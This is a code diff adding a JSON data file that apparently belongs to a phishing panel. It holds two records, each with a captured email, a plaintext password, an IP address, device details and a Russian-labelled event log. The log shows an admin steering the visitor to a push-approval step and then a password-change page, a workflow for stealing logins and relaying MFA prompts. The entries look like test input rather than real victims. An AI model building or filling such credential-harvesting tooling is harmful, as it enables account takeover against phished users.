@@ -1,0 +1,74 @@
+[
+  {
+    "id": "mmero3w5ujrlkgu9sqm",
+    "email": "eаwgweg@web.de",
+    "password": "3g2few",
+    "createdAt": "2026-03-06T10:43:42.389Z",
+    "lastSeenAt": "2026-03-06T10:43:43.842Z",
+    "status": "redirect_change_password",
+    "ip": "172.68.189.198",
+    "eventTerminal": [
+      {
+        "at": "2026-03-06T10:43:42.389Z",
+        "label": "Ввел почту"
+      },
+      {
+        "at": "2026-03-06T10:43:43.842Z",
+        "label": "Ввел пароль",
+        "source": "user"
+      },
+      {
+        "at": "2026-03-06T10:43:47.165Z",
+        "label": "Отправлен на пуш",
+        "source": "admin"
+      },
+      {
+        "at": "2026-03-06T10:43:55.680Z",
+        "label": "Отправлен на смену пароля",
+        "source": "admin"
+      }
+    ],
+    "platform": "macos",
+    "screenWidth": 1728,
+    "screenHeight": 1117,
+    "passwordHistory": [
+      "3g2few"
+    ]
+  },
+  {
+    "id": "mmerqt11brvjrv60jb9",
+    "email": "gweegwweg@gmx.de",
+    "password": "23few",
+    "createdAt": "2026-03-06T10:45:48.277Z",
+    "lastSeenAt": "2026-03-06T10:45:49.809Z",
+    "status": "redirect_change_password",
+    "ip": "172.68.189.192",
+    "eventTerminal": [
+      {
+        "at": "2026-03-06T10:45:48.277Z",
+        "label": "Ввел почту"
+      },
+      {
+        "at": "2026-03-06T10:45:49.809Z",
+        "label": "Ввел пароль",
+        "source": "user"
+      },
+      {
+        "at": "2026-03-06T10:45:53.685Z",
+        "label": "Отправлен на пуш",
+        "source": "admin"
+      },
+      {
+        "at": "2026-03-06T10:46:00.120Z",
+        "label": "Отправлен на смену пароля",
+        "source": "admin"
+      }
+    ],
+    "platform": "macos",
+    "screenWidth": 2189,
+    "screenHeight": 1415,
+    "passwordHistory": [
+      "23few"
+    ]
+  }
+]
